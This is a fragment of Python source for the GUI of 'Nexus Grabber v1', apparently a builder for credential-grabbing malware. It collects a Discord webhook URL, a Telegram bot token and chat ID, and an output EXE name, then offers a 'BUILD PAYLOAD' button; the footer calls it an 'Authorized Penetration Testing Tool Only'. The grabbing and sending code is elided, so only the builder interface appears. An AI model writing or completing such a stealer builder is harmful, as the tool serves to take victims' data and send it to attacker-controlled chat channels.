...
class BuilderGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Nexus Grabber v1")
        self.geometry("650x750")
        self.resizable(True, True)

        # webhook
        ctk.CTkLabel(self, text="Discord Webhook URL:", anchor="w").pack(pady=(15,0), padx=20, fill="x")
        ...
        # Telegram (optional)
        ctk.CTkLabel(self, text="Telegram Token (optional):", anchor="w").pack(pady=(5,0), padx=20, fill="x")
        self.telegram_token = ctk.CTkEntry(self, placeholder_text="Leave blank if using Discord only")
        self.telegram_token.pack(pady=(2,5), padx=20, fill="x")
        ctk.CTkLabel(self, text="Telegram Chat ID:", anchor="w").pack(pady=(2,0), padx=20, fill="x")
        self.telegram_chat = ctk.CTkEntry(self, placeholder_text="")
        ...
        # Output name
        ctk.CTkLabel(self, text="Output EXE Name:", anchor="w").pack(pady=(5,0), padx=20, fill="x")
        self.output_name = ctk.CTkEntry(self, placeholder_text="NexusPayload")
        self.output_name.insert(0, "NexusPayload")
        self.output_name.pack(pady=(2,10), padx=20, fill="x")

        # Build button
        self.build_btn = ctk.CTkButton(self, text="BUILD PAYLOAD", command=self.build, height=40, font=("Arial", 14))
        ...
        ctk.CTkLabel(self, text="Authorized Penetration Testing Tool Only", font=("Arial", 9), text_color="gray").pack(pady=(0,5))
